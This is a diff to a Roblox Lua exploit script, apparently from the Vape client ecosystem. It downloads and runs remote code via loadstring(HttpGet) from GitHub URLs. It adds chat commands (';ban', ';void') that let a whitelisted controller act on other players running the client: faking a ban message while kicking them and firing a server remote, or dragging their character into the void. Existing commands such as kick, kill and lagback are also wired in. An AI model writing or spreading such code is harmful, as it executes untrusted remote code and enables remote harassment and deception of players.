@@ -1,5 +1,6 @@
 local lplr = game:GetService("Players").LocalPlayer
 local whitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCore/Chattags/main/stupidwhitelists.lua"))()
+local entityLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/Libraries/entityHandler.lua"))()
 
 local funcs = {}
 function funcs:kill()
@@ -244,6 +245,22 @@ function funcs:reinject()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
 	end
 end
+function funcs:ban()
+	task.spawn(function()
+		lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
+	end)
+	game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"].TeleportToLobby:FireServer()
+end
+function funcs:void()
+	if entityLibrary.isAlive then
+		task.spawn(function()
+			repeat
+				task.wait()
+				entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + Vector3.new(0, -3, 0)
+			until not entityLibrary.isAlive
+		end)
+	end
+end
 function sysmsg(text, color)
     game.StarterGui:SetCore(
         "ChatMakeSystemMessage",
@@ -280,6 +297,8 @@ for i,v in pairs(game:GetService("Players"):GetChildren()) do
 				funcs:reset()
 			elseif a == ";byfron" then
 				funcs:byfron()
+			elseif a == ";void" then
+				funcs:void()
 			elseif a == ";kill2" then
 				funcs:kill2()
 			elseif a == ";lagback" then
@@ -304,6 +323,8 @@ for i,v in pairs(game:GetService("Players"):GetChildren()) do
 				funcs:uninject()
 			elseif a == ";kick" then
 				funcs:kick()
+			elseif a == ";ban" then
+				funcs:ban()
 			elseif a == ";lobby" then
 				funcs:lobby()
 			end
@@ -319,6 +340,8 @@ for i,v in pairs(game:GetService("Players").PlayerAdded) do
 				funcs:reset()
 			elseif a == ";byfron" then
 				funcs:byfron()
+			elseif a == ";void" then
+				funcs:void()
 			elseif a == ";kill2" then
 				funcs:kill2()
 			elseif a == ";lagback" then
@@ -341,6 +364,8 @@ for i,v in pairs(game:GetService("Players").PlayerAdded) do
 				funcs:rickroll()
 			elseif a == ";kick" then
 				funcs:kick()
+			elseif a == ";ban" then
+				funcs:ban()
 			elseif a == ";lobby" then
 				funcs:lobby()
 			end
